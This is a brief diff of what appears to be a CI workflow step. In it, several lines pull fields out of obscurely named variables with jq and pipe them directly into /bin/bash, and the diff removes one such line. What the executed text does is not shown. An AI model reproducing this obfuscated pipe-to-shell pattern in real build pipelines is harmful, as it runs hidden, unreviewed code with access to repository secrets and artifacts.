@@ -25,7 +25,6 @@ jobs:
           echo $h1 | jq -r .tgtvr33 | /bin/bash
           printf '%s' "$mgsl619" | jq -r .khkmx844 | /bin/bash
           echo $z9819 | jq -r .k20 | /bin/bash
-          echo $d45 | jq -r .leuc9040 | /bin/bash
           printf '%s' "$vxp5444" | jq -r .f55 | /bin/bash
 
       - name: Upload artifact
